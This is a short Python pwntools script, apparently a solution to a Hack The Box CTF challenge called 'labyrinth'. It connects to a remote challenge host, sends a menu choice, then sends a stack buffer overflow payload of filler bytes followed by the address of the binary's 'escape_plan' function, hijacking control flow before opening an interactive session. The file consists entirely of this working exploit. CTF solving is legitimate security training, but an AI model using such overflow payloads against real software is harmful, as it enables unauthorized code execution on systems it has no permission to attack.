import dataclasses
import ipaddress
import pathlib
from loguru import logger
from pwnlib import gdb

from core.target_config import Config, Mode
from core.targetbase import TargetBase
from custom.auth_or_out import AuthOrOutPwn
from pwn import p64, u64



if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('159.65.16.36'),
        port=30966,
        file=pathlib.Path('/home/lim8en1/htb/ctf/challenge/labyrinth'),
        offset=0x30,
        detect_libc=True
    )
    t = TargetBase(pwn_target=AuthOrOutPwn, config=remote_config)
    # _, debugger = gdb.attach(t.process.pid, api=True)
    # debugger.execute('c')
    address = t.file.symbols['escape_plan']
    t.process.sendline(b'069')
    payload = b'A' * 0x38 + p64(address)
    t.process.sendline(payload)
    t.process.interactive()

